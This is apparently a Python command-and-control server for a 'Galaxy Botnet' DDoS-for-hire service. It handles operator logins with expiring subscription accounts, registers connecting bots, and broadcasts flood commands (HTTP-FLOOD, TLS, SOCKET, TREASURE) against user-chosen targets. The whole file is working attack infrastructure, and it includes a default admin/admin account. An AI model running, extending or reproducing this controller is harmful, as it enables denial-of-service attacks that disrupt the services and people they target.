import socket
import threading
import sys
import time
import json
import os
import requests
from datetime import datetime
from colorama import Fore, init, Style
from bannersanim.banners import bannerlogin1, bannerlogin2, bannerlogin3, bannerlogin4, helpmessage1, helpmessage2, expirybanner, banner

GRADIENT = [
    '\033[38;2;148;0;211m',
    '\033[38;2;153;50;204m',
    '\033[38;2;186;85;211m',  
    '\033[38;2;218;112;214m', 
    '\033[38;2;238;130;238m', 
    '\033[38;2;255;0;255m',  
    '\033[38;2;255;105;180m'
]

def apply_gradient(text):
    result = []
    gradient_len = len(GRADIENT)
    text_len = len(text)
    
    for i, char in enumerate(text):
        if char.strip():
            color_index = int((i / text_len) * (gradient_len - 1))
            result.append(f"{GRADIENT[color_index]}{char}")
        else:
            result.append(char)
    return ''.join(result)

bots = []
active_attacks = {}
max_global_conc = 15
ansi_clear = '\033[2J\033[H'

user_template = {
    "username": "",
    "password": "",
    "max_conc": 3,
    "expiry_date": "2023-12-31",
    "is_admin": 0,
    "is_vip": 0,
    "max_attack_time": 60
}

def get_isp_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/org")
        return response.text.strip() if response.status_code == 200 else "Unknown ISP"
    except:
        return "Unknown ISP"

if not os.path.exists('users.json'):
    with open('users.json', 'w') as f:
        json.dump({"admin": {**user_template, 
                           "username": "admin", 
                           "password": "admin", 
                           "is_admin": 1, 
                           "max_conc": 5,
                           "max_attack_time": 1200}}, f)

def load_users():
    with open('users.json') as f:
        return json.load(f)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(users, f, indent=4)

def send_command(command):
    for client in bots:
        try:
            client.sendall(command.encode())
        except:
            bots.remove(client)

def find_login(username, password):
    users = load_users()
    if username in users:
        if users[username]['password'] == password:
            expiry_date = datetime.strptime(users[username]['expiry_date'], "%Y-%m-%d")
            if datetime.now() > expiry_date:
                return "expired"
            return users[username]
    return None

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Style.RESET_ALL
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def update_title(client, username, user_data):
    users = load_users()
    while True:
        try:
            expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d")
            days_left = (expiry_date - datetime.now()).days
            active_conc = len([a for a in active_attacks.values() if a['username'] == username])
            max_conc = users.get(username, {}).get('max_conc', 3)
            title = f'💫 Galaxy Botnet | Concs: {active_conc}/{max_conc} | Global concs: {len(active_attacks)}/{max_global_conc} | Expiry: {days_left}d.'
            send(client, f'\33]0;{title}\a', False)
            time.sleep(2)
        except:
            client.close()
            break

def can_launch_attack(username):
    users = load_users()
    user_data = users.get(username, {})
    
    # Check user's max conc
    user_active = len([a for a in active_attacks.values() if a['username'] == username])
    if user_active >= user_data.get('max_conc', 3):
        return False, "User conc limit reached"
    
    # Check global conc
    if len(active_attacks) >= max_global_conc:
        return False, "Global conc limit reached"
    
    return True, ""

def stop_attack(target):
    for attack_id, attack in list(active_attacks.items()):
        if attack['target'] == target:
            try:
                send_command(f"STOP {target}")
                active_attacks.pop(attack_id)
                return True
            except:
                active_attacks.pop(attack_id)
                return False
    return False

def attack_timer(attack_id, attack_time, username, target):
    """Background thread to track attack duration and remove when expired"""
    start_time = time.time()
    end_time = start_time + attack_time
    
    while time.time() < end_time:
        time.sleep(1)
    
    # Attack time expired, remove from active attacks
    if attack_id in active_attacks:
        active_attacks.pop(attack_id)
        try:
            send_command(f"STOP {target}")
        except:
            pass

def command_line(client, username, user_data):
    users = load_users()
    user_data = users.get(username, {})
    
    for x in banner.split('\n'):
        send(client, apply_gradient(x))

    prompt = f'{GRADIENT[-1]}[{username}] ► '
    send(client, prompt, False)

    while True:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                for x in helpmessage1.split('\n'):
                    send(client, apply_gradient(x))
                for x2 in helpmessage2.split('\n'):
                    send(client, apply_gradient(x2))
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, apply_gradient(x))

            elif command == 'LOGOUT':
                send(client, f'{GRADIENT[3]}Goodbye :-)')
                time.sleep(1)
                break
                
            elif command == 'WHOAMI':
                expiry_date = datetime.strptime(user_data['expiry_date'], "%Y-%m-%d")
                days_left = (expiry_date - datetime.now()).days
                
                send(client, f'{GRADIENT[2]}Username: {username}')
                send(client, f'Account type: {"VIP" if user_data["is_vip"] else "Standard"}')
                send(client, f'Max concurrent attacks: {user_data["max_conc"]}')
                send(client, f'Max attack time: {user_data["max_attack_time"]}s')
                send(client, f'Expiry date: {user_data["expiry_date"]} ({days_left} days left)')
                send(client, f'Admin privileges: {"Yes" if user_data["is_admin"] else "No"}')

            elif command in ['HTTP-FLOOD', 'TLS', 'SOCKET', 'TREASURE']:
                if len(args) < 3:
                    send(client, f'{GRADIENT[0]}Usage: <method> <target> <time>')
                else:
                    target = args[1]
                    is_blacklisted = False
                    try:
                        with open('blacklist.txt', 'r') as f:
                            blacklist = f.read().splitlines()
                            for entry in blacklist:
                                if entry.strip() and entry in target:
                                    is_blacklisted = True
                                    break
                    except FileNotFoundError:
                        pass
                    if is_blacklisted:
                        send(client, f'{GRADIENT[0]}Target is blacklisted! Attack aborted.')
                    can_attack, reason = can_launch_attack(username)
                    if not can_attack:
                        send(client, f'{GRADIENT[0]}Cannot launch attack: {reason}')
                    else:
                        try:
                            attack_time = int(args[2])
                            if attack_time > user_data['max_attack_time']:
                                send(client, f'{GRADIENT[0]}Attack time exceeds your maximum of {user_data["max_attack_time"]} seconds')
                                continue
                        except:
                            send(client, f'{GRADIENT[0]}Invalid attack time')
                            continue
                        try:
                            import socket
                            hostname = target.split(':')[0].split('/')[0] if '://' not in target else target.split('://')[1].split(':')[0].split('/')[0]
                            ip = socket.gethostbyname(hostname)
                            org_info = get_isp_info(ip)
                        except:
                            org_info = "Unknown ISP"
                        attack_id = f"{username}-{time.time()}"
                        active_attacks[attack_id] = {
                            'username': username,
                            'method': command,
                            'target': target,
                            'time': attack_time,
                            'start_time': time.time()
                        }
                        threading.Thread(
                            target=attack_timer,
                            args=(attack_id, attack_time, username, target),
                            daemon=True
                        ).start()
                        send_command(f"{command} {target} 120")
                        send(client, ansi_clear, False)
                        for x in banner.split('\n'):
                            send(client, apply_gradient(x))
                        attack_info = (f'''
{GRADIENT[3]}╔══════════════════════════════════╗
║{GRADIENT[4]} Attack successfully launched!{GRADIENT[3]} 
╠══════════════════════════════════╣
║ {GRADIENT[2]}Method: {GRADIENT[5]}{command:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Target: {GRADIENT[5]}{target:<25} {GRADIENT[3]}
║ {GRADIENT[2]}Time: {GRADIENT[5]}{attack_time} seconds{' '*(18-len(str(attack_time)))} {GRADIENT[3]}
║ {GRADIENT[2]}Provider: {GRADIENT[5]}{org_info:<18} {GRADIENT[3]}
║ {GRADIENT[2]}Attack ID: {GRADIENT[5]}{attack_id:<18} {GRADIENT[3]}
╚══════════════════════════════════╝{Style.RESET_ALL}''')
            
                        for x in attack_info.split('\n'):
                            send(client, f"{x}")

            elif command == 'STOPL7':
                if len(args) < 2:
                    send(client, f'{GRADIENT[0]}Usage: STOPL7 <METHOD>')
                else:
                    send_command("STOPL7 args[1]")
                    send(client, f'{GRADIENT[4]}Attack with {args[1]} stopped')

            else:
                send(client, f'{GRADIENT[0]}Unknown Command')

            send(client, prompt, False)
        except Exception as e:
            print(f"Error: {e}")
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Galaxy Botnet loading..\a', False)
    login_banners = [bannerlogin1, bannerlogin2, bannerlogin3, bannerlogin4]
    for banner in login_banners:
        send(client, ansi_clear, False)
        for x in banner.split('\n'):
            send(client, apply_gradient(x))
        time.sleep(0.9)
    
    send(client, ansi_clear, False)
    send(client, f'\33]0;Galaxy Botnet | Login\a', False)

    while True:
        send(client, ansi_clear, False)
        send(client, f'{GRADIENT[3]}𝐄𝐍𝐓𝐄𝐑 𝐋𝐎𝐆𝐈𝐍: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while True:
        send(client, ansi_clear, False)
        send(client, f'{GRADIENT[3]}𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        user_data = find_login(username, password)
        if user_data == "expired":
            send(client, f'{GRADIENT[0]}{expirybanner}')
            time.sleep(3)
            client.close()
            return
        elif not user_data:
            send(client, f'{GRADIENT[0]}Ｉｎｖａｌｉｄ ｃｒｅｄｅｎｔｉａｌｓ')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username, user_data)).start()
        command_line(client, username, user_data)

    else:
        # Bot connection
        for x in bots:
            if x.getpeername()[0] == address[0]:
                client.close()
                return
        bots.append(client)

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <cnc_port>')
        exit()

    cnc_port = sys.argv[1]
    
    if not cnc_port.isdigit() or int(cnc_port) < 1 or int(cnc_port) > 65535:
        print('Invalid CNC port')
        exit()
        
    cnc_port = int(cnc_port)

    init(convert=True)

    cnc_sock = socket.socket()
    cnc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    cnc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        print(f"{GRADIENT[4]}CNC port started on port {cnc_port}")
        cnc_sock.bind(('0.0.0.0', cnc_port))
    except:
        print(f'{GRADIENT[0]}Failed to bind CNC port')
        exit()

    cnc_sock.listen()
    
    threading.Thread(target=lambda: 
        [threading.Thread(target=handle_client, args=[*cnc_sock.accept()]).start() 
        for _ in iter(int, 1)]).start()
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', 3000))
        server_socket.listen()
        while True:
            print(f"{GRADIENT[3]}Botnet port started.. Listening on port 3000")
            conn, addr = server_socket.accept()
            bots.append(conn)
            client_thread = threading.Thread(target=handle_bot, args=(conn, addr))
            client_thread.start()

def handle_bot(conn, addr):
    print(f"{GRADIENT[2]}Connected to {addr}")
    conn.sendall(b"CJCB{EQE<K>LJR")
    while True:
        data = conn.recv(2048)
        if not data:
            break
        print(f"{GRADIENT[5]}Received from client {addr}: {data.decode()}")
    print(f"{GRADIENT[0]}Connection closed with {addr}")
    conn.close()
    bots.remove(conn)

if __name__ == '__main__':
    main()